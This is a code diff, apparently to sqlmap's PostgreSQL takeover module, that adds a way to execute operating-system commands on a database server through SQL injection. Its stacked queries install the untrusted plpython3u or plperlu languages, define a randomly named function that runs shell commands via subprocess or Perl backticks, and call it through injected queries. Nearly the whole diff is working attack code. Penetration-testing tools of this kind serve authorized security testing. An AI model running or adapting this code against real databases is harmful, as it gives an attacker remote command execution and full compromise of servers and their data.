@@ -17,6 +17,7 @@ from lib.core.common import isNoneValue
 from lib.core.common import isStackingAvailable
 from lib.core.common import randomStr
 from lib.core.compat import LooseVersion
+from lib.core.convert import getText
 from lib.core.data import conf
 from lib.core.data import kb
 from lib.core.data import logger
@@ -128,3 +129,48 @@ class Takeover(GenericTakeover):
             kb.copyExecTest = self.copyExecCmd("echo 1") == '1'
 
         return kb.copyExecTest
+
+    def _plRun(self, func, cmd):
+        output = inject.getValue("%s('%s')" % (func, cmd.replace("'", "''")), resumeValue=False, safeCharEncode=False)
+
+        if isListLike(output):
+            output = flattenValue(output)
+            output = filterNone(output)
+
+            if not isNoneValue(output):
+                output = os.linesep.join(getText(_) for _ in output)
+
+        return output
+
+    def _plExecFunc(self):
+        # NOTE: forge a command-exec function through an untrusted procedural language. Unlike the shared
+        # library UDF this needs no precompiled binary (the ancient 'lib_postgresqludf_sys' artifacts),
+        # only a superuser-installable language - a maintainable fallback when 'COPY ... FROM PROGRAM' is blocked
+        if kb.get("plExecFunc") is None:
+            kb.plExecFunc = ""
+
+            if isStackingAvailable() or conf.direct:
+                func = randomStr(lowercase=True)
+
+                for language, body in (("plpython3u", "import subprocess; return subprocess.check_output(cmd, shell=True).decode()"),
+                                       ("plperlu", "return `$_[0]`;")):
+                    inject.goStacked("CREATE EXTENSION IF NOT EXISTS %s" % language, silent=True)
+                    inject.goStacked("CREATE OR REPLACE FUNCTION %s(cmd text) RETURNS text AS $$ %s $$ LANGUAGE %s" % (func, body, language), silent=True)
+
+                    if (self._plRun(func, "echo 1") or "").strip() == '1':
+                        kb.plExecFunc = func
+
+                        infoMsg = "the back-end DBMS allows command execution via the '%s' procedural language" % language
+                        logger.info(infoMsg)
+
+                        break
+
+        return kb.plExecFunc or None
+
+    def checkPlExec(self):
+        return self._plExecFunc() is not None
+
+    def plExecCmd(self, cmd, silent=False):
+        func = self._plExecFunc()
+
+        return self._plRun(func, cmd) if func else None
